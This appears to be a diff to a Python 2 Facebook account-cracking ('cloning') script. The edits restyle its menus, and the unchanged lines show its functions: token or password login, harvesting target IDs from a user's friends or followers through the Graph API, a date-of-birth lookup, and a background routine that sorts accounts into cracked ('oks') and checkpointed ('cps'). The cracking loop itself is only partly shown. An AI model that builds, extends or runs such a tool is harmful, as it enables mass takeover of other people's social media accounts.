@@ -68,13 +68,12 @@ def logo():
 \033[1;37m  ╚════════════════════════════════════╝"""
 def method_menu():
     os.system("clear")
-    logo()
-    print("")
+    print logo
     print("\t    \033[1;32mClone Method Menu\033[0;97m")
-    print("")
-    print("[1] B-api (Fast)")
-    print("[2] Localhost")
-    print("")
+    os.system('echo -e "--------------------------------------------"| lolcat')
+    print("\x1b[1;37m ➤ [1] B-api (Fast)")
+    print("\x1b[1;37m ➤ [2] Localhost")
+    os.system('echo -e "--------------------------------------------"| lolcat')
     method_menu_select()
 def method_menu_select():
     afza = raw_input(" Choose method >>> ")
@@ -89,23 +88,22 @@ def method_menu_select():
         method_menu_select()
 def login():
     os.system("clear")
-    logo()
-    print("")
-    print("\t    "+c+"FB Login Menu"+c2)
-    print("")
-    print("[1] Token login")
-    print("[2] ID/Pass login")
-    print("")
+    print logo
+    print("[\033[1;91m\033[1;47m---------------LOGIN MENU-----------------\033[0m]")
+    os.system('echo -e "--------------------------------------------"| lolcat')
+    print("\x1b[1;37m ➤ [1] Token login")
+    print("\x1b[1;37m ➤ [2] ID/Pass login")
+    os.system('echo -e "--------------------------------------------"| lolcat')
     login_select()
 def login_select():
-    afza = raw_input(" Choose login method >>> ")
+    afza = raw_input(" \x1b[1;37mChoose ➤ \x1b[1;32m")
     if afza =="1":
         os.system("clear")
-        logo()
-        print("")
-        print("\t    \033[1;32mFB Token Login\033[0;97m")
-        print("")
-        token = raw_input(" Past token here : ")
+        print logo
+        print("[\033[1;91m\033[1;47m---------------Login token----------------\033[0m]\033[1;37m")
+        os.system('echo -e "--------------------------------------------"| lolcat')
+        token = raw_input(" \x1b[1;37mPast Token ➤ \x1b[1;32m")
+        os.system('echo -e "--------------------------------------------"| lolcat')
         token_s = open(".fb_token.txt","w")
         token_s.write(token)
         token_s.close()
@@ -122,7 +120,7 @@ def login_select():
             print("")
             print("\t    \033[1;31mToken not valid\033[0;97m")
             print("")
-            raw_input(" Press enter to try again ")
+            raw_input("\x1b[1;31m Press enter to try again ")
             login()
     elif afza =="2":
         login_fb()
@@ -133,16 +131,15 @@ def login_select():
         login_select()
 def login_fb():
 	os.system("clear")
-	logo()
-	print("")
-	print("\t    \033[1;32mFB ID/PASS Login\033[0;97m")
-	print("")
-	id = raw_input(" ID/Mail/Num : ")
+	print logo
+	print("[\033[1;91m\033[1;47m------------Login With Fb/ID--------------\033[0m]\033[1;37m")
+	os.system('echo -e "--------------------------------------------"| lolcat')
+	id = raw_input("\x1b[1;37m ID/Mail/Num ➤ \x1b[1;32m")
 	id1=id.replace(' ','')
 	id2=id1.replace('(','')
 	uid=id2.replace(')','')
-	pwd = raw_input(" Password   : ")
-	print("")
+	pwd = raw_input(" \x1b[1;37mPassword  ➤ \x1b[1;32m")
+	os.system('echo -e "--------------------------------------------"| lolcat')
 	data=requests.get('http://localhost:5000/auth?id='+uid+'&pass='+pwd, headers=header).text
 	q = json.loads(data)
 	if "loc" in q:
@@ -195,22 +192,20 @@ def b_menu():
         raw_input(" Press enter to try again \033[0;97m")
         b_menu()
     os.system("clear")
-    logo()
-    print("")
+    print logo
     print("\t  "+c+"Logged In User"+ok+c2)
-    print("")
-    os.system('echo -e "-----------------------------------------------"| lolcat')
-    print("")
-    print("[1] Crack from public id")
-    print("[2] Crack from followers")
-    print("[3] View token")
-    print("[4] Find date of birth")
-    print("[5] Return method menu")
-    print("[6] Logout")
-    print("")
+    print("\033[1;37m[\033[1;91m\033[1;47m------------Free mode Cloning-------------\033[0m]\033[1;37m")
+    os.system('echo -e "--------------------------------------------"| lolcat')
+    print("\x1b[1;37m ➤ [1] Crack from public id")
+    print("\x1b[1;37m ➤ [2] Crack from followers")
+    print("\x1b[1;37m ➤ [3] View token")
+    print("\x1b[1;37m ➤ [4] Find date of birth")
+    print("\x1b[1;37m ➤ [5] Return method menu")
+    print("\x1b[1;37m ➤ [6] Logout")
+    os.system('echo -e "--------------------------------------------"| lolcat')
     b_menu_select()
 def b_menu_select():
-	select = raw_input("\nChoose Option >>> ")
+	select = raw_input("\n\x1b[1;37mChoose ➤ \x1b[1;32m")
 	id=[]
 	oks=[]
 	cps=[]
@@ -220,21 +215,18 @@ def b_menu_select():
 		print("")
 		os.system('echo -e "\t    Public ID Cloning " | lolcat')
 		print("")
-		idt = raw_input(" Put Id/user :  ")
+		idt = raw_input(" Public ID ➤ \x1b[1;32m")
 		os.system("clear")
-		logo()
-		print("")
+		print logo
 		os.system('echo -e "\t    Gathering Information " | lolcat')
-		print("")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			q = json.loads(r.text)
 			os.system("clear")
-			logo()
-			print("")
-			os.system('echo -e "\t    Public ID Cloning " | lolcat')
-			print("")
-			print(" Target user : "+q["name"])
+			print logo 
+			print("[\033[1;91m\033[1;47m------------PUBLIC ID CLONING-------------\033[0m]\033[0;97m")
+			os.system('echo -e "--------------------------------------------"| lolcat')
+			print(" \x1b[1;37mTarget user ➤ \x1b[1;32m"+q["name"])
 		except (KeyError , IOError):
 		    print("")
 		    print("\n\t    \033[1;31m Logged in id has checkpoint\033[0;97m")
@@ -250,11 +242,9 @@ def b_menu_select():
 			id.append(uid+'|'+nm)
 	elif select =="2":
 		os.system("clear")
-		logo()
-		print("")
-		os.system('echo -e "\t    Followers Cloning " | lolcat')
-		print("")
-		idt = raw_input(" Put Id/user : ")
+		print logo
+		print("[\033[1;91m\033[1;47m------------FOLLOWERS ID  CLONING-------------\033[0m]\033[0;97m")
+		idt = raw_input("\x1b[1;37m Public ID ➤ \x1b[1;32m")
 		os.system("clear")
 		logo()
 		print("")
@@ -267,12 +257,9 @@ def b_menu_select():
 			logo()
 			print("")
 			os.system('echo -e "\t    Followers Cloning" | lolcat')
-			print("")
-			print(" Target user : "+q["name"])
+			print(" Target user ➤ \x1b[1;32m "+q["name"])
 		except (KeyError , IOError):
-		    print("")
 		    print("\n\t    \033[1;31m Logged in id has checkpoint\033[0;97m")
-		    print("")
 		    raw_input("\nPress enter to back ")
 		    b_menu()
 		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
@@ -291,18 +278,12 @@ def b_menu_select():
 	elif select =="6":
 	    logout()
 	else:
-	    print("")
 	    print("\t    "+c+"Select valid method"+c2)
-	    print("")
 	    b_menu_select()
-	print(" Total IDs : "+str(len(id)))
+	print(" \x1b[1;37mTotal IDs ➤ \x1b[1;32m"+str(len(id)))
 	time.sleep(0.5)
 	print(" The process is running in background")
-	print("")
-	print 47*("-")
-	print('')
-	
-	
+
 	def main(arg):
 		user=arg
 		uid,name=user.split("|")
